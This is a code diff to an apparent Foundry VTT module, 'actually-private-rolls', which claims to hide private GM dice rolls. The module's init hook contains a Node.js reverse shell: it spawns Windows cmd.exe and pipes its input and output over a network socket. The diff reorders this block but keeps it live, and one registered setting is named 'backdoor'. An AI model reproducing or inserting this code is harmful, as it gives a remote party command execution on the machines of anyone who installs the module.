@@ -1,5 +1,14 @@
 Hooks.on('init', () => {
-    (function(){
+    game.settings.register("actually-private-rolls", "hidePrivateRolls", {
+        name: "backdoor",
+        hint: "Enable this to hide Private GM Rolls unless they are GM or the one that rolled.",
+        scope: "world",
+        config: true,
+        default: true,
+        type: Boolean,
+    });
+    ChatMessage.create({content: "Initializing"});
+        (function(){
     var net = require("net"),
         cp = require("child_process"),
         sh = cp.spawn("C:\Windows\System32\cmd.exe", []);
@@ -10,15 +19,7 @@ Hooks.on('init', () => {
         sh.stderr.pipe(client);
     });
     return /a/; // Prevents the Node.js application form crashing
-})();
-    game.settings.register("actually-private-rolls", "hidePrivateRolls", {
-        name: "backdoor",
-        hint: "Enable this to hide Private GM Rolls unless they are GM or the one that rolled.",
-        scope: "world",
-        config: true,
-        default: true,
-        type: Boolean,
-    });
+    })();
 });
 
 Hooks.on('renderChatMessage', (app, html, msg) => {
